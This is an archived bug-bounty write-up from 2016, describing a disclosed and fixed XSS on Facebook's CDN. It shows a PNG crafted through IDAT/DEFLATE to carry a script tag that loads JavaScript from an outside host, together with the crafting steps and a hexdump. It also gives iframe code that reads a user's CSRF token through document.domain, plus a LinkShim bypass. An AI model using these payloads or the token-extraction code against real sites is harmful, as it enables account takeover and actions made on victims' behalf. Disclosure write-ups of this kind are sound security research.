---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-01-27_an-xss-on-facebook-via-pngs-wonky-content-types.md
original_filename: 2016-01-27_an-xss-on-facebook-via-pngs-wonky-content-types.md
title: An XSS on Facebook via PNGs & Wonky Content Types
category: documents
detected_topics:
- xss
- command-injection
- file-upload
- otp
- rate-limit
- automation-abuse
tags:
- imported
- documents
- xss
- command-injection
- file-upload
- otp
- rate-limit
- automation-abuse
language: en
raw_sha256: a4cdfc1507ed9fc455f31a7f6f749a98e09c624bc95d29f1959d52e3b42b13dc
text_sha256: d3e247ae5983e8523034aa58d9469d7dd0d329321374d2c952f04ea31350aa69
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: true
---

# An XSS on Facebook via PNGs & Wonky Content Types

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-01-27_an-xss-on-facebook-via-pngs-wonky-content-types.md
- Source Type: markdown
- Detected Topics: xss, command-injection, file-upload, otp, rate-limit, automation-abuse
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: True
- Raw SHA256: `a4cdfc1507ed9fc455f31a7f6f749a98e09c624bc95d29f1959d52e3b42b13dc`
- Text SHA256: `d3e247ae5983e8523034aa58d9469d7dd0d329321374d2c952f04ea31350aa69`


## Content

---
title: "An XSS on Facebook via PNGs & Wonky Content Types"
page_title: "An XSS on Facebook via PNGs & Wonky Content Types – Jack"
url: "https://whitton.io/articles/xss-on-facebook-via-png-content-types"
final_url: "https://whitton.io/articles/xss-on-facebook-via-png-content-types/"
authors: ["Jack Whitton (@fin1te)"]
programs: ["Meta / Facebook"]
bugs: ["XSS"]
publication_date: "2016-01-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6320
---

# [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/ "An XSS on Facebook via PNGs & Wonky Content Types")

## January 27, 2016

__Reading time ~6 minutes

Content uploaded to Facebook is stored on their [CDN](https://en.wikipedia.org/wiki/Content_delivery_network), which is served via various domains (most of which are sub-domains of either `akamaihd.net` or `fbcdn.net`).

The [captioning feature of Videos](https://www.facebook.com/help/261764017354370) also stores the `.srt` files on the CDN, and I noticed that right-angle brackets were un-encoded.
  
  
  https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xaf1/….srt

[ ![](/images/facebookxss/facebook-xss-1-1.png) ](/images/facebookxss/facebook-xss-1-1.png)

I was trying to think of ways to get the file interpreted as HTML. Maybe MIME sniffing (since there’s no `[X-Content-Type-Option](https://www.owasp.org/index.php/List_of_useful_HTTP_headers)` header)?

It’s actually a bit easier than that. We can just change the extension to `.html` (which probably shouldn’t be possible…).
  
  
  https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xaf1/t39.2093-6/….html

[ ![](/images/facebookxss/facebook-xss-1.png) ](/images/facebookxss/facebook-xss-1.png)

Unfortunately left angles are stripped out (which I later found out was due to [@phwd](https://twitter.com/phwd)’s very [much related finding](http://philippeharewood.com/ability-to-upload-html-via-srt-caption-files-for-facebook-videos/)), so there’s not much we can do here. Instead, I looked for other files which could also be loaded as `text/html`.

A lot of the photos/videos on Facebook now seem to contain a hash in the URL (parameters `oh` and `__gda__`), which causes an error to be thrown if we modify the file extension.

Luckily, advert images don’t contain these parameters.

[ ![](/images/facebookxss/facebook-xss-2.png) ](/images/facebookxss/facebook-xss-2.png)

All that we have to do now is find a way to embed some HTML into an image. The trouble is that [Exif](https://en.wikipedia.org/wiki/Exchangeable_image_file_format) data is stripped out of JPEGs, and [iTXt chunks](http://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html#C.Anc-text) are stripped out of PNGs.

If we try to blindly insert a string into an image and upload it we receive an error.

[ ![](/images/facebookxss/facebook-xss-3.png) ](/images/facebookxss/facebook-xss-3.png)

#### PNG IDAT Chunks

I started searching for ideas and came across this great blog post: [“Encoding Web Shells in PNG IDAT chunks”](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). This section of this bug is made possible due that post, so props to the author.

The post describes encoding data into the [IDAT](http://www.w3.org/TR/PNG/#11IDAT) chunk, which ensures it’ll stay there even after the modifications Facebook’s image uploader makes.

The author kindly provides a [proof-of-concept image](https://www.idontplaydarts.com/images/phppng.png), which worked perfectly (the PHP shell obviously won’t execute, but it demonstrates that the data survived uploading).

[ ![](/images/facebookxss/facebook-xss-4.png) ](/images/facebookxss/facebook-xss-4.png)

Now, I could have submitted the bug there and then - we’ve got proof that images can be served with a content type of `text/html`, and angle brackets aren’t encoded (which means we can certainly inject HTML).

But that’s boring, and everyone knows an XSS isn’t an XSS without an alert box.

The author also provides an [XSS ready PNG](https://www.idontplaydarts.com/images/xsspng.png), which I could just upload and be done. But since it references a remote JS file, I wasn’t too keen on the bug showing up in a referer log. Plus I wanted to try myself to create one of these images.

As mentioned in post, the first step is to craft a string, that when compressed using [DEFLATE](https://en.wikipedia.org/wiki/DEFLATE), produces the desired output. Which in this case is:
  
  
  <SCRIPT src=//FNT.PE><script>

Rather than trying to create this by hand, I used a brute-force solution (I’m sure there are _much_ better ways, but I wanted to whip up a script and leave it running):

  * Convert the desired output to hex - `3c534352495054205352433d2f2f464e542e50453e3c2f7363726970743e`
  * Prepend `0x00` -> `0xff` to the string (one to two times)
  * Append `0x00` -> `0xff` to the string (one to two times)
  * Attempt to uncompress the string until an error isn’t thrown
  * Check that the result contains our expected string

The script took a while to run, but it produced the following output:
  
  
  7ff3992819221115106919***REDACTED-SUSPECT-TOKEN***Compressing the above confirms that we get our string back:
  
  
  fin1te@mbp /tmp » php -r "echo gzdeflate(hex2bin('7ff399281922111510691928276e6e5c1e151e51241f576e69b16375535b6f')) . PHP_EOL;"
  ??<SCRIPT SRC=//FNT.PE></script>
  

Combining the result, with the PHP code for reversing PNG filters and generating the image, gives us the following:

[ ![](/images/facebookxss/xss-fnt-pe-png.png) ](/images/facebookxss/xss-fnt-pe-png.png)

Which, when dumped, shows our payload:
  
  
  fin1te@mbp /tmp » hexdump -C xss-fnt-pe-png.png
  00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
  00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 fc 18 ed  |... ... ........|
  00000020  a3 00 00 00 09 70 48 59  73 00 00 0e c4 00 00 0e  |.....pHYs.......|
  00000030  c4 01 95 2b 0e 1b 00 00  00 65 49 44 41 54 48 89  |...+.....eIDATH.|
  00000040  63 ac ff **3c 53 43 52 49  50 54 20 53 52 43 3d 2f**  |c..**< SCRIPT SRC=/**|
  00000050  **2f 46 4e 54 2e 50 45 3e  3c 2f 73 63 72 69 70 74**  |**/FNT.PE ></script**|
  00000060  **3e** c3 ea c0 46 8d 17 f3  af de 3d 73 d3 fd 15 cb  |**>**...F.....=s....|
  00000070  43 2f 0f b5 ab a7 af ca  7e 7d 2d ea e2 90 22 ae  |C/......~}-...".|
  00000080  73 85 45 60 7a 90 d1 8c  3f 0c a3 60 14 8c 82 51  |s.E`z...?..`...Q|
  00000090  30 0a 46 c1 28 18 05 a3  60 14 8c 82 61 00 00 78  |0.F.(...`...a..x|
  000000a0  32 1c 02 78 65 1f 48 00  00 00 00 49 45 4e 44 ae  |2..xe.H....IEND.|
  000000b0  42 60 82  |B`.|
  

We can then upload it to our advertiser library, and browse to it (with an extension of `.html`).

[ ![](/images/facebookxss/facebook-xss-5.png) ](/images/facebookxss/facebook-xss-5.png)

#### Bypassing Link Shim

What can you do with an XSS on a CDN domain? Not a lot.

All I could come up with is a LinkShim bypass. [LinkShim](https://www.facebook.com/notes/facebook-security/link-shim-protecting-the-people-who-use-facebook-from-malicious-urls/10150492832835766) is script/tool which all external links on Facebook are forced through. This then checks for malicious content.

[ ![](/images/facebookxss/facebook-xss-6.png) ](/images/facebookxss/facebook-xss-6.png)

CDN URL’s however _aren’t_ Link Shim’d, so we can use this as a bypass.

[ ![](/images/facebookxss/facebook-xss-7.png) ](/images/facebookxss/facebook-xss-7.png)

#### Moving from the Akamai CDN hostname to *.facebook.com

Redirects are pretty boring. So I thought I’d check to see if any `*.facebook.com` DNS entries were pointing to the CDN.

I found `photo.facebook.com` (I forgot to screenshot the output of `dig` before the patch, so here’s an entry from Google’s cache):

[ ![](/images/facebookxss/facebook-xss-8.png) ](/images/facebookxss/facebook-xss-8.png)

Browsing to this host with our image as the path loads a JavaScript file from [fnt.pe](https://fnt.pe), which then displays an alert box with the hostname.

[ ![](/images/facebookxss/facebook-xss-9.png) ](/images/facebookxss/facebook-xss-9.png)

Any session cookies are marked as [HTTPOnly](https://en.wikipedia.org/wiki/HTTP_cookie#HttpOnly_cookie), and we can’t make requests to `www.facebook.com`. What do we do other than popping an alert box?

#### Enter `document.domain`

It’s possible for two pages from a different origin, but sharing the same parent domain, to interact with each other, providing they both set the `[document.domain](https://developer.mozilla.org/en-US/docs/Web/API/Document/domain)` property to the parent domain.

We can easily do this for our page, since we can run arbitrary JavaScript. But we also need to find a page on `www.facebook.com` which does the same, and doesn’t have an `[X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options)` header set to `DENY` or `SAMEORIGIN` (we’re still cross-origin at this point).

This wasn’t too difficult to find - Facebook has various plugins which are meant to be placed inside an `<iframe>`.

We can use the [Page Plugin](https://developers.facebook.com/docs/plugins/page-plugin). It sets the `document.domain` property, and also contains `fb_dtsg` (the CSRF token Facebook uses).

[ ![](/images/facebookxss/facebook-xss-10.png) ](/images/facebookxss/facebook-xss-10.png)

What we now need to do is load the plugin inside an iframe, wait for the `onload` event to fire, and extract the token from the content.
  
  
  document.domain = 'facebook.com';
  
  var i = document.createElement('iframe');
  i.setAttribute('id', 'i');
  i.setAttribute('style', 'visibility:hidden;width:0px;height:0px;');
  i.setAttribute('src', 'https://www.facebook.com/v2.4/plugins/page.php?adapt_container_width=true&app_id=113869198637480&channel=https%3A%2F%2Fs-static.ak.facebook.com%2Fconnect%2Fxd_arbiter%2FX9pYjJn4xhW.js%3Fversion%3D41%23cb%3Df365065abc%26domain%3Ddevelopers.facebook.com%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff366e4bcac%26relation%3Dparent.parent&container_width=588&hide_cover=false&href=https%3A%2F%2Fwww.facebook.com%2Ffacebook&locale=en_GB&sdk=joey&show_facepile=true&show_posts=true&small_header=false');
  
  i.onload = function(){
  alert(document.domain + "\nfb_dtsg: " + i.contentWindow.document.getElementsByName('fb_dtsg')[0].value);
  };
  
  document.body.appendChild(i);

Notice how the alert box now shows `facebook.com`, not `photos.facebook.com`.

[ ![](/images/facebookxss/facebook-xss-11.png) ](/images/facebookxss/facebook-xss-11.png)

We now have access to the user’s CSRF token, which means we can make arbitrary requests on their behalf (such as posting a status, etc).

It’s also possible to issue [XHR](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) requests via the iframe to extract data from `www.facebook.com` (rather than blindly post data with the token).

So it turns out an XSS on the CDN can do _pretty much_ everything that one on the main site can.

#### Fix

Facebook quickly hot-fixed the issue by removing the forward DNS entry for `photo.facebook.com`.

[ ![](/images/facebookxss/facebook-xss-12.png) ](/images/facebookxss/facebook-xss-12.png)

Whilst the content type issue still exists, it’s a lot less severe since the files are hosted on a sandboxed domain.

#### Bonus ASCII Art

One easter-egg I found was that if you append `.txt` or `.html` to the URL (rather than replace the file extension), you get a cool ASCII art version of the image. This also works for images on Instagram (since they share the same CDN).

[Try it out yourself](https://fbcdn-photos-b-a.akamaihd.net/hphotos-ak-xtf1/t39.2081-0/11409241_518100315004842_156594719_n.jpg.html):

[ ![](/images/facebookxss/facebook-xss-13.png) ](/images/facebookxss/facebook-xss-13.png) [websec](https://whitton.io/tags/#websec "Pages tagged websec")[bugbounty](https://whitton.io/tags/#bugbounty "Pages tagged bugbounty")[xss](https://whitton.io/tags/#xss "Pages tagged xss")[facebook](https://whitton.io/tags/#facebook "Pages tagged facebook")[cdn](https://whitton.io/tags/#cdn "Pages tagged cdn")[png](https://whitton.io/tags/#png "Pages tagged png")[content-type](https://whitton.io/tags/#content-type "Pages tagged content-type") Updated on January 27, 2016 Jack

  * [__Like](https://www.facebook.com/sharer/sharer.php?u=https://whitton.io/articles/xss-on-facebook-via-png-content-types/ "Share on Facebook")
  * [__Tweet](https://twitter.com/intent/tweet?text=https://whitton.io/articles/xss-on-facebook-via-png-content-types/ "Share on Twitter")
  * [__+1](https://plus.google.com/share?url=https://whitton.io/articles/xss-on-facebook-via-png-content-types/ "Share on Google Plus")

[Read More](https://whitton.io/articles/messenger-site-wide-csrf/)

### [From Bug Bounty Hunter, to Engineer, and Beyond](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/ "From Bug Bounty Hunter, to Engineer, and Beyond")

A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a "new chapter" in my ...… [Continue reading](https://whitton.io/articles/from-researcher-to-engineer-and-beyond/)

#### [Obtaining Login Tokens for an Outlook, Office or Azure Account](https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/ "Obtaining Login Tokens for an Outlook, Office or Azure Account")

Published on April 03, 2016

#### [Uber Bug Bounty: Turning Self-XSS into Good-XSS](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/ "Uber Bug Bounty: Turning Self-XSS into Good-XSS")

Published on March 22, 2016
